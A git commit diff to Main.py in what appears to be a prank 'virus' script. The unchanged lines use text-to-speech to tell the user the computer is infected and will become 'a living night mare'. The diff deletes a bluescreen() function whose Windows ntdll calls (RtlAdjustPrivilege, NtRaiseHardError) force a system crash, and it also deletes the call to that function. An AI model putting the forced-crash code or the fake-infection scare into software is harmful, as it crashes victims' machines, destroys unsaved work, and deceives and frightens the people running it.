94211e7ac4018f36a91d991baae7dc08eb554ff4
TBDScriptz <tobdecidd@gmail.com>
2025-05-11 17:26:07 -0700

    Update Main.py

--- Main.py
+++ Main.py
@@ -7,8 +7,4 @@ engine =  tts.init()
 engine.say("Hello, your computer has been infected with a virus that will make your computer a living night mare, have fun with this") # living heel as in not blue screen but just as annoything as possible
 engine.runAndWait()
 
-def bluescreen():
-    ctypes.windll.ntdll.RtlAdjustPrivilege(20, True, False, ctypes.byref(ctypes.c_bool()))
-    ctypes.windll.ntdll.NtRaiseHardError(0xC0000006, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong()))
 
-bluescreen()
